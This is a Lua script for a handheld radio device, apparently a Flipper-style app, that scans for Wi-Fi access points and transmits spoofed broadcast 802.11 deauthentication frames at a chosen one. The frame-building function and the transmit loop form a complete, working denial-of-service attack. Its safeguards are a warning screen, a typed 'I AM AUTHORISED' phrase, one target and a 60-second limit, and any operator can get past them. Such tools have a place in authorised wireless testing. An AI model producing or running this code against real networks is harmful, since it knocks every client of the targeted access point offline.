-- Deauth test (ACTIVE, transmits). For testing networks YOU are authorised to test.
-- Flow: warning screen -> scan beacons -> pick ONE AP -> type the authorisation phrase -> burst.
-- Hard limits: one BSSID, one channel, 60 s maximum per run, every run ends on Back.
-- Frames are management deauth (subtype 12) from the chosen AP to broadcast, no client list.

local PHRASE = "I AM AUTHORISED"
local SCAN_MS = 10000
local DWELL_MS = 800
local MAX_RUN_MS = 60000
local BURST_EVERY_MS = 100
local FRAMES_PER_BURST = 3
local MAX_APS = 30
local CHANS = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
local LH = 26

local W, H = 0, 0
local aps, ap_list = {}, {}
local ci, last_hop = 1, 0
local menu_cur = 1

local function clip(s, n) return #s > n and s:sub(1, n) or s end
local function header(t) gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, t, "ui12", "bw") end

local function screen_text(lines, footer)
  gfx.clear(); W, H = gfx.size()
  header("Deauth test (ACTIVE)")
  local y = 56
  for _, l in ipairs(lines) do gfx.text(16, y, l, "ui12"); y = y + LH + 4 end
  gfx.text(14, H - 34, footer, "small")
  gfx.present()
end

local function on_beacon(frame, ch, rssi)
  if #frame < 37 or (frame:byte(1) & 0xFC) ~= 0x80 then return end
  local bssid = frame:sub(17, 22)
  local ssid = ""
  local i = 37
  while i + 1 <= #frame do
    local tag, len = frame:byte(i), frame:byte(i + 1)
    if tag == 0 then ssid = frame:sub(i + 2, i + 1 + len); break end
    i = i + 2 + len
  end
  if not ssid:match("^[%g ]*$") then ssid = "" end
  local a = aps[bssid]
  if not a then
    if #ap_list >= MAX_APS then return end
    a = { bssid = bssid, ssid = ssid, ch = ch, rssi = rssi or -99 }
    aps[bssid] = a
    ap_list[#ap_list + 1] = a
  else
    if ssid ~= "" then a.ssid = ssid end
    a.ch = ch
    if rssi then a.rssi = rssi end
  end
end

local function scan()
  local ok, err = wifi.monitor_start({ channel = CHANS[1] })
  if not ok then return nil, err end
  local t0 = system.millis()
  last_hop = t0
  while system.millis() - t0 < SCAN_MS do
    local frame, meta = wifi.monitor_recv()
    while frame do
      on_beacon(frame, (meta and meta.channel) or CHANS[ci], meta and meta.rssi)
      frame, meta = wifi.monitor_recv()
    end
    if system.millis() - last_hop >= DWELL_MS then
      ci = ci % #CHANS + 1
      wifi.monitor_channel(CHANS[ci])
      last_hop = system.millis()
    end
    screen_text({ "Scanning 2.4 GHz for APs...", string.format("%d networks heard", #ap_list), "Confirm = pick now, Back = quit" }, "Chooses one AP next")
    local e = input.poll()
    if e == "back" then wifi.monitor_stop(); return nil end
    if e == "confirm" and #ap_list > 0 then break end
    app.sleep(20)
  end
  wifi.monitor_stop()
  return true
end

local function pick()
  while true do
    gfx.clear(); W, H = gfx.size(); header("Pick ONE target AP")
    if #ap_list == 0 then gfx.text(18, 60, "No networks heard.", "ui12") end
    local y = 56
    for i, a in ipairs(ap_list) do
      if y > H - 70 then break end
      local label = string.format("%-16s ch%-2d %d", clip(a.ssid ~= "" and a.ssid or "<hidden>", 16), a.ch, a.rssi)
      if i == menu_cur then gfx.rect(10, y - 4, W - 20, LH + 4, true); gfx.text(16, y, label, "small", "w")
      else gfx.text(16, y, label, "small") end
      y = y + LH
    end
    gfx.text(14, H - 34, "Up/Down pick, Confirm select, Back cancel", "small")
    gfx.present()
    local e = input.wait()
    if e == "up" then menu_cur = menu_cur > 1 and menu_cur - 1 or #ap_list
    elseif e == "down" then menu_cur = menu_cur < #ap_list and menu_cur + 1 or 1
    elseif e == "confirm" and #ap_list > 0 then return ap_list[menu_cur]
    elseif e == "back" then return nil end
  end
end

-- 802.11 deauth management frame, 26 bytes, FCS appended by the radio.
local function deauth_frame(bssid)
  return "\192\0"                          -- frame control: management, subtype 12 (deauth)
    .. "\0\0"                              -- duration
    .. string.rep("\255", 6)               -- addr1: broadcast
    .. bssid .. bssid                      -- addr2 (source = AP), addr3 (BSSID)
    .. "\0\0"                              -- sequence control
    .. "\7\0"                              -- reason 7: class 3 frame from non-associated station
end

local function burst(t)
  local ok, err = wifi.tx_start({ channel = t.ch })
  if not ok then
    screen_text({ "Could not start transmit:", clip(tostring(err), 50) }, "Back to exit")
    while input.wait() ~= "back" do end
    return
  end
  local frame = deauth_frame(t.bssid)
  local t0 = system.millis()
  local last_draw = -1000
  while true do
    local now = system.millis()
    if now - t0 >= MAX_RUN_MS then break end
    for _ = 1, FRAMES_PER_BURST do wifi.tx(frame) end
    if now - last_draw >= 1000 then
      local info = wifi.tx_info()
      screen_text({
        "TRANSMITTING (authorised test)",
        clip(t.ssid ~= "" and t.ssid or "<hidden>", 26),
        string.format("ch %d  sent %d", t.ch, info and info.sent or 0),
        string.format("stops in %d s", (MAX_RUN_MS - (now - t0)) // 1000),
      }, "Back = stop now")
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(BURST_EVERY_MS)
  end
  wifi.tx_stop()
  screen_text({ "Stopped.", "Transmit off." }, "Back to exit")
  while input.wait() ~= "back" do end
end

local function main()
  W, H = gfx.size()
  screen_text({
    "This TRANSMITS deauth frames.",
    "Use only on a network you own",
    "or are written authorisation to test.",
    "Disrupts every client of that AP.",
    "Hard limit: one AP, 60 s per run.",
  }, "Confirm to continue, Back to quit")
  if input.wait() ~= "confirm" then return end
  local ok = scan()
  if not ok then return end
  local t = pick()
  if not t then return end
  local phrase = input.text("Type: " .. PHRASE, "", #PHRASE, "text")
  if phrase ~= PHRASE then
    screen_text({ "Phrase did not match.", "Nothing was sent." }, "Back to exit")
    while input.wait() ~= "back" do end
    return
  end
  burst(t)
end

local ok, err = pcall(main)
if not ok then
  pcall(function() wifi.tx_stop() end)
  pcall(function() wifi.monitor_stop() end)
  gfx.clear()
  gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b")
  gfx.present()
  while input.wait() ~= "back" do end
end
wifi.tx_stop()
app.exit()
